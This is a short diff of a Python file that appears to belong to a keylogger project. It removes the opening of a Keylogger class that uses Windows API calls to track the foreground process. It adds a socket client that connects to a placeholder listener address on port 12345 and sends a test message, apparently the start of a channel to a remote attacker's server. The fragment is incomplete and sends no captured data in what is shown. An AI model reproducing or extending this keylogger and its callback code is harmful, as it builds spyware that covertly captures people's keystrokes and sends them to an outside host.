@@ -42,17 +42,11 @@ time_interval = 10
 
 # =========================================== Base code ==============================================
 
-TIMEOUT = 60 * 10
+import socket
 
+HOST = "<listener_ip>"  # The server's hostname or IP address
+PORT = 12345  # The port used by the server
 
-class Keylogger:
-    def __init__(self):
-        self.current_windows = None
-
-    def get_current_process(self):
-        hwnd = windll.user32.GetForegroundWindow()
-        pid = c_ulong(0)
-        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
-        process_id = f"{pid.value}"
-
-        executable = create_string_buffer(512)
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.connect((HOST, PORT))
+    s.sendall(b"Hello, server!")
